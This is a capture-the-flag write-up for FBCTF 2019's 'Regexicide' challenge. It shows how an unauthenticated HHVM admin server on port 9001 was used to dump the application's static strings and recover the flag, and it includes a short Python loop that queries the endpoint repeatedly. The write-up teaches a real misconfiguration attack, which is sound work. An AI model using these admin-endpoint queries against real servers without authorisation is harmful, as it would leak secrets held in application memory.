# Regexicide

1000 points - 3 Solves

```  
I finally figured out the passphrase to the EVIL club. It's pretty complicated
so I've decided to store it in my server in case I forget.  
I've protected it with a password though, so it's virtually impossible for
anyone else to get it. I sometimes accidentally enter my  
password multiple times, so I added a twist to my server to handle that case
too.  
For some reason my server gets bloated after a while - nothing frequent
deploys can't fix.  
http://34.212.86.199/

(This problem does not require any brute force or scanning. We will ban your
team if we detect brute force or scanning).  
```

## Solution:

For this problem we found that port 9001 was open. After looking at the
webpage we realize that this was HHVM with the [admin
server](https://hhvm.com/blog/521/the-adminserver) exposed and
unauthenticated.

Looking at the different options available to us on the admin page this
section seemed particularly promising:  
```  
/static-strings:  get number of static strings  
/static-strings-rds: ... that correspond to defined constants  
/dump-static-strings: dump static strings to /tmp/static_strings  
/random-static-strings: return randomly selected static strings  
  count         number of strings to return, default 1  
```

We can query `http://34.212.86.199:9001/static-strings` to retrieve the number
of static strings.

Then, we can query `http://34.212.86.199:9001/random-static-strings?count=num`
in order to retreive all static strings in the application.

The flag can be found with a quick search for `fb{`.

#### Bonus  
Additionally, we also wrote a dumper in parallel to continous dump strings
before we tried `count` parameter on GET request

```python  
import requests

f = open('solve.txt','w')  
for i in xrange(0,1000):  
       r = requests.get("http://34.212.86.199:9001/random-static-strings")  
       f.write(r.text.encode('utf-8').strip())  
```

```  
$ cat solve.txt | grep 'fb{'  
```  

Original writeup (https://github.com/utcoalition/Public-CTF-
Writeups/blob/master/fbctf-2019/regexicide/README.md).